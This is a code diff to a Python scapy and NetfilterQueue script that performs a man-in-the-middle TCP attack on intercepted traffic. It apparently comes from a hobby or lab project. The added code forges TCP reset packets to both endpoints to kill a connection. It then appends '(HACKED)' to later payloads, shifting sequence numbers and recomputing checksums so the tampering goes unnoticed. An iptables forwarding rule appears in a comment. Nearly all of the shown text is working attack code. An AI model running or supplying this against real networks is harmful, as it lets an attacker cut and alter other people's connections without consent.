@@ -5,6 +5,7 @@ import sys
 import threading
 import time
 from netfilterqueue import NetfilterQueue
+from copy import deepcopy
 
 # Don't forget to forward packets to the queue
 # iptables -I FORWARD -j NFQUEUE --queue-num 1
@@ -62,34 +63,57 @@ fake_server_th.start()
 
 captured_packets = []
 
+first_conn = True
 def process_packet_seq_spoof(pkt):
-    global first_packet
+    global first_conn
     scapy_pkt = IP(pkt.get_payload())
+    print(f"Src: {scapy_pkt[IP].src}, Dst: {scapy_pkt[IP].dst}")
 
     if scapy_pkt.haslayer(Raw) and scapy_pkt.haslayer(TCP):
-        og_msg = scapy_pkt[Raw].load
-        print(f"Original payload: {og_msg}")
+        # Barge right in their conversation and reset it
+        if first_conn:
+            print("Barging right in")
+            first_conn = False
 
-        # Add my super original message
-        my_msg = b"(HACKED)"
-        new_msg = og_msg + my_msg
-        
-        # Change the sequence number(they will never know)
-        scapy_pkt[TCP].seq -= len(my_msg)
-        scapy_pkt[Raw].load = new_msg
+            # Send reset to destination        
+            send(IP(src=scapy_pkt[IP].src, dst=scapy_pkt[IP].dst)/
+                 TCP(sport=scapy_pkt[TCP].sport, dport=scapy_pkt[TCP].dport, flags="R",
+                    seq=scapy_pkt[TCP].seq, ack=scapy_pkt[TCP].ack))
+            
+            # Send reset to source
+            send(IP(src=scapy_pkt[IP].dst, dst=scapy_pkt[IP].src)/
+                 TCP(sport=scapy_pkt[TCP].dport, dport=scapy_pkt[TCP].sport, flags="R",
+                    seq=scapy_pkt[TCP].ack, ack=scapy_pkt[TCP].seq + len(scapy_pkt[Raw].load)))
+            
+            # Drop the old packet(they will never know!!!)
+            pkt.drop()
+        else: # We are in, just hack the message now
+            og_msg = scapy_pkt[Raw].load
+            print(f"Original payload: {og_msg}")
 
-        # Re-do checksums(thanks scappy)
-        del scapy_pkt[IP].len
-        del scapy_pkt[IP].chksum
-        del scapy_pkt[TCP].chksum
+            # Add my super original message
+            my_msg = b"(HACKED)"
+            new_msg = og_msg + my_msg
+            
+            # Change the sequence number(they will never know)
+            scapy_pkt[TCP].seq -= len(my_msg)
+            scapy_pkt[Raw].load = new_msg
+            scapy_pkt[TCP].flags.P = True
 
-        # Set the new message mwahahahha
-        pkt.set_payload(bytes(scapy_pkt))
-        print(f"Hacking complete ;)")
+            # Re-do checksums(thanks scappy)
+            del scapy_pkt[IP].len
+            del scapy_pkt[IP].chksum
+            del scapy_pkt[TCP].chksum
+
+            # Send the new message
+            pkt.set_payload(bytes(scapy_pkt))
+            pkt.accept()
+
+            print("Hacking complete ;)")
     else:
         print(f"WEIRD PACKET: {pkt}!")
+        pkt.accept()
 
-    pkt.accept()
 
 queue = NetfilterQueue()
 queue.bind(1, process_packet_seq_spoof)
